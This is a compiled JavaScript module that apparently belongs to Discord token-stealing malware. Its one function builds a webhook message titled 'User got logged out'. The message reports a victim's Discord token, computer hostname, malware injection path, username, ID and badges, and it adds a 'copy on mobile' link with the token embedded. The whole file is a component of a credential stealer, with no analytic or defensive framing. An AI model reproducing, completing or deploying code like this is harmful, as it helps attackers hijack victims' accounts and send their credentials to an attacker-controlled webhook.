"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getUserLogoutEmbed = void 0;
const constants_1 = require("../constants");
const fakeProfile_1 = require("../fakeProfile");
const utils_1 = require("../utils");
const baseEmbed_1 = require("./helpers/baseEmbed");
async function getUserLogoutEmbed(config, account = new fakeProfile_1.FakeAccount()) {
    const { embeds, webhookMessage } = (0, baseEmbed_1.getBaseEmbeds)(config);
    const embed = embeds[0];
    embed.setTitle("User got logged out");
    const token = account.discord.token;
    embed.setDescription(`[**${constants_1.PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${constants_1.COPY_ON_MOBILE}${token})`);
    embed.setThumbnail(await account.discord.getAvatar());
    embed.setFields([{
            name: "Info",
            value: (0, utils_1.warpTripleQuote)(`Hostname: \n${account.computerName}\nInjection Info: \n${account.injectionPath}\n`),
            inline: false
        }, {
            name: "Username",
            value: (0, utils_1.warpInQuote)(account.discord.tag),
            inline: true
        }, {
            name: "ID",
            value: (0, utils_1.warpInQuote)(account.discord.id),
            inline: true
        }, {
            name: "Badges",
            value: account.discord.badges.join(" "),
            inline: false
        }, {
            name: "Token",
            value: (0, utils_1.warpTripleQuote)(account.discord.token),
            inline: false
        }]);
    return webhookMessage();
}
exports.getUserLogoutEmbed = getUserLogoutEmbed;
